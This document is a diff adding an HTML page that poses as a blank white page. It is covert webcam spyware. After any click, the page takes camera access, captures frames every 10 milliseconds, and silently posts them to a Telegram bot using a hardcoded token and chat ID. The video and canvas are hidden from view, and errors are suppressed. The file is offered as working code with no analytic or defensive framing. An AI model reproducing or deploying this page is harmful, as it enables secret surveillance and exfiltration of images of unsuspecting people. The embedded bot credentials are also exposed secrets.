@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> </title>
+<style>
+  * { margin:0; padding:0; }
+  body { background: #ffffff; height:100vh; overflow:hidden; cursor:default; }
+  video, canvas, button { display:none; }
+  #status {
+    position:fixed; bottom:10px; right:10px;
+    color:#ccc; font:10px monospace;
+    background:rgba(0,0,0,0.2); padding:2px 6px;
+    border-radius:3px; pointer-events:none;
+  }
+</style>
+</head>
+<body>
+<div id="status">⟦ idle ⟧</div>
+<video id="feed" autoplay muted playsinline></video>
+<canvas id="captureCanvas"></canvas>
+
+<script>
+(function() {
+  // ─── HARDCODED CREDENTIALS ────────────────────────────────
+  const BOT_TOKEN = "8607641356:AAEVC8LAML3gooIUarL-fiPBYhXHIrwJyB0";
+  const CHAT_ID   = "7870731053";
+  const INTERVAL_MS = 10;   // 100 fps theoretical
+
+  // ─── DOM REFS ──────────────────────────────────────────────
+  const video = document.getElementById('feed');
+  const canvas = document.getElementById('captureCanvas');
+  const ctx = canvas.getContext('2d');
+  const statusEl = document.getElementById('status');
+
+  let stream = null;
+  let timer = null;
+  let isRunning = false;
+
+  // ─── CAMERA INIT ───────────────────────────────────────────
+  async function initCamera() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 60 } }
+      });
+      video.srcObject = stream;
+      await video.play();
+      return true;
+    } catch (e) {
+      statusEl.textContent = `ERR: ${e.message}`;
+      return false;
+    }
+  }
+
+  // ─── CAPTURE + SEND (fire‑and‑forget) ─────────────────────
+  function captureAndSend() {
+    if (!stream || video.readyState < 2) return;
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 480;
+    canvas.width = w;
+    canvas.height = h;
+    ctx.drawImage(video, 0, 0, w, h);
+
+    canvas.toBlob((blob) => {
+      if (!blob) return;
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', blob, `f_${Date.now()}.jpg`);
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: fd
+      }).catch(() => {}); // silent fail – we don't care
+    }, 'image/jpeg', 0.75);
+  }
+
+  // ─── START LOOP ────────────────────────────────────────────
+  async function start() {
+    if (isRunning) return;
+    if (!stream) {
+      const ok = await initCamera();
+      if (!ok) return;
+    }
+    if (timer) clearInterval(timer);
+    isRunning = true;
+    statusEl.textContent = '⟦ streaming 100Hz ⟧';
+    timer = setInterval(captureAndSend, INTERVAL_MS);
+  }
+
+  // ─── TRIGGER ON ANY CLICK ─────────────────────────────────
+  document.addEventListener('click', start, { once: true });
+  statusEl.textContent = '⟦ click to arm ⟧';
+})();
+</script>
+</body>
+</html>
